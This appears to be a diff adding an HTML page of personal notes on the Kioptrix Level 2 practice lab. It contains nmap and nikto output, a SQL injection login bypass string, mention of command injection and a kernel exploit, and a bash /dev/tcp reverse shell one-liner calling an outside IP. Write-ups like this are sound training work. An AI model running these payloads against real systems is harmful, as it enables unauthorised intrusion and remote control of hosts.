@@ -1,0 +1,141 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>kioptrix2</title>
+</head><body>Target IP: 10.0.0.25<br/>
+Attacker IP: 10.0.0.22<br/>
+<br/>
+Nmap scan report for 10.0.0.25<br/>
+Host is up (0.0022s latency).<br/>
+Not shown: 993 closed ports<br/>
+PORT   STATE SERVICE VERSION<br/>
+22/tcp  open ssh   OpenSSH 3.9p1 (protocol 1.99)<br/>
+| ssh-hostkey: <br/>
+|  1024 8f:3e:8b:1e:58:63:fe:cf:27:a3:18:09:3b:52:cf:72 (RSA1)<br/>
+|  1024 34:6b:45:3d:ba:ce:ca:b2:53:55:ef:1e:43:70:38:36 (DSA)<br/>
+|_ 1024 68:4d:8c:bb:b6:5a:bd:79:71:b8:71:47:ea:00:42:61 (RSA)<br/>
+|_sshv1: Server supports SSHv1<br/>
+80/tcp  open http   Apache httpd 2.0.52 ((CentOS))<br/>
+|_http-server-header: Apache/2.0.52 (CentOS)<br/>
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).<br/>
+111/tcp open rpcbind 2 (RPC #100000)<br/>
+| rpcinfo: <br/>
+|  program version  port/proto service<br/>
+|  100000 2      111/tcp rpcbind<br/>
+|  100000 2      111/udp rpcbind<br/>
+|  100024 1      663/udp status<br/>
+|_ 100024 1      666/tcp status<br/>
+443/tcp open ssl/http Apache httpd 2.0.52 ((CentOS))<br/>
+|_http-server-header: Apache/2.0.52 (CentOS)<br/>
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).<br/>
+| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--<br/>
+| Not valid before: 2009-10-08T00:10:47<br/>
+|_Not valid after: 2010-10-08T00:10:47<br/>
+|_ssl-date: 2018-06-13T16:12:48+00:00; -3h09m48s from scanner time.<br/>
+| sslv2: <br/>
+|  SSLv2 supported<br/>
+|  ciphers: <br/>
+|   SSL2_RC4_128_EXPORT40_WITH_MD5<br/>
+|   SSL2_DES_64_CBC_WITH_MD5<br/>
+|   SSL2_DES_192_EDE3_CBC_WITH_MD5<br/>
+|   SSL2_RC2_128_CBC_EXPORT40_WITH_MD5<br/>
+|   SSL2_RC2_128_CBC_WITH_MD5<br/>
+|   SSL2_RC4_64_WITH_MD5<br/>
+|_  SSL2_RC4_128_WITH_MD5<br/>
+631/tcp open ipp   CUPS 1.1<br/>
+| http-methods: <br/>
+|_ Potentially risky methods: PUT<br/>
+|_http-server-header: CUPS/1.1<br/>
+|_http-title: 403 Forbidden<br/>
+666/tcp open status  1 (RPC #100024)<br/>
+3306/tcp open mysql  MySQL (unauthorized)<br/>
+MAC Address: 00:0C:29:03:49:2E (VMware)<br/>
+Device type: general purpose<br/>
+Running: Linux 2.6.X<br/>
+OS CPE: cpe:/o:linux:linux_kernel:2.6<br/>
+OS details: Linux 2.6.9 - 2.6.30<br/>
+Network Distance: 1 hop<br/>
+<br/>
+Host script results:<br/>
+|_clock-skew: mean: -3h09m48s, deviation: 0s, median: -3h09m48s<br/>
+<br/>
+<br/>
+Started dirb and nikto again.<br/>
+<br/>
+--- Scanning URL: http://10.0.0.25/ ----<br/>
++ http://10.0.0.25/cgi-bin/ (CODE:403|SIZE:285)                <br/>
++ http://10.0.0.25/index.php (CODE:200|SIZE:667)                <br/>
+==&gt; DIRECTORY: http://10.0.0.25/manual/                    <br/>
++ http://10.0.0.25/usage (CODE:403|SIZE:282)    <br/>
+<br/>
++ Server: Apache/2.0.52 (CentOS)<br/>
++ Retrieved x-powered-by header: PHP/4.3.9<br/>
++ The anti-clickjacking X-Frame-Options header is not present.<br/>
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br/>
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type<br/>
++ Apache/2.0.52 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.<br/>
++ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE <br/>
++ Web Server returns a valid response with junk HTTP methods, this may cause false positives.<br/>
++ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST<br/>
++ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.<br/>
++ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.<br/>
++ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.<br/>
++ Server leaks inodes via ETags, header found with file /manual/, fields: 0x5770d 0x1c42 0xac5f9a00;5770b 0x206 0x84f07cc0 <br/>
++ Uncommon header 'tcn' found, with contents: choice<br/>
++ OSVDB-3092: /manual/: Web server manual found.<br/>
++ OSVDB-3268: /icons/: Directory indexing found.<br/>
++ OSVDB-3268: /manual/images/: Directory indexing found.<br/>
++ OSVDB-3233: /icons/README: Apache default file found.<br/>
++ 8328 requests: 1 error(s) and 17 item(s) reported on remote host<br/>
++ End Time:      2018-06-13 15:27:39 (GMT-4) (67 seconds)<br/>
+<br/>
+Web server has this<br/>
+<img src="image.png"/><br/>
+<br/>
+<br/>
+<img src="image 2.png"/><br/>
+I didn't find any exploits for any of the services so at this point, I was assuming I can use sql injection to bypass the login form. My manual injection attempts didn't work. <br/>
+<br/>
+I also tried sqlmap but It didn't seem to work. <br/>
+I did find an exploit named sigcups but that didn't seem to work either.<br/>
+<br/>
+I had to look at a walkthrough for a hint. WTF, I had tried similar SQL injection and that didn't work. I used sqlmap with data I got from burp and that didn't work...<br/>
+<br/>
+So this <br/>
+admin' OR 1=1-- - works <br/>
+but <br/>
+admin' OR 1=1-- doesn't<br/>
+<br/>
+damn it.<br/>
+<br/>
+here's what I see<br/>
+<img src="image 3.png"/><br/>
+<br/>
+You can do command injection here<br/>
+<img src="image 4.png"/><br/>
+<br/>
+<br/>
+There are the users on the system:<br/>
+<img src="image 5.png"/><br/>
+<br/>
+The machine has wget and python installed.<br/>
+<br/>
+I modified infodox tcp reverse shell and used simplehttpserver to serve it. on target side, i downloaded that shell to temp.<br/>
+<br/>
+<img src="image 6.png"/><br/>
+<br/>
+<br/>
+This was the kernel running 2.6.9-55.EL on Centos 4.5.<br/>
+<br/>
+There is an exploit for that: https://www.exploit-db.com/exploits/9542/<br/>
+<br/>
+<img src="image 7.png"/><br/>
+<br/>
+<br/>
+I was checking other walkthroughs and you can also use this for reverse shell:<br/>
+bash -i &gt;&amp; /dev/tcp/192.168.182.147/443 0&gt;&amp;1 <br/>
+I copied it from http://www.gcura.tech/vulnhub-kioptrix-level-1-1-2/<br/>
+<br/>
+I think that technique is mentioned in RTFM book too. <br/>
+<br/>
+</body></html>
